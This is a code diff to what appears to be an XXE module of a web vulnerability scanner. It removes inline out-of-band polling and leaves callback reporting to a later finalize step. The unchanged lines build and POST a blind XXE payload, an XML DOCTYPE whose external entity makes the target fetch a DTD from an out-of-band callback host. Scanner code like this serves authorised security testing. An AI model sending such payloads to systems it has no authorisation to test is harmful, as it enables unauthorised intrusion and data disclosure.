@@ -77,9 +77,6 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
     # 2) OOB DNS / HTTP exfiltration
     if ctx.oob and ctx.oob.registered:
         token = ctx.oob.token()
-        oob_body = _payload_oob(token, ctx.oob.backend.domain.split(".", 1)[1]
-                                if "." in ctx.oob.backend.domain else ctx.oob.backend.domain)
-        # actually use the full domain
         oob_body = f"""<?xml version="1.0"?>
 <!DOCTYPE r [
   <!ENTITY % sx SYSTEM "http://{token}.{ctx.oob.backend.domain}/dtd">
@@ -99,19 +96,7 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
         })
         await ctx.http.post(url, data=oob_body,
                             headers={"Content-Type": "application/xml"})
-        # poll OOB
-        import asyncio
-        await asyncio.sleep(2.0)
-        events = await ctx.oob.poll(token)
-        if events:
-            findings.append({
-                "category": "xxe",
-                "title": "XXE — blind, confirmed via OOB",
-                "severity": "critical", "cvss": 9.0,
-                "url": url, "payload": oob_body,
-                "evidence": f"Parser fetched the external DTD ({len(events)} OOB hits) — "
-                            "blind XXE confirmed even though no body is reflected.",
-                "request": f"POST {url}\nContent-Type: application/xml\n\n{oob_body}",
-                "metadata": {"detection": "oob"},
-            })
+        # the callback (when it arrives) is emitted by oob.pending_findings()
+        # at finalize — self-reporting here would duplicate the same finding
+        # under a different title
     return findings
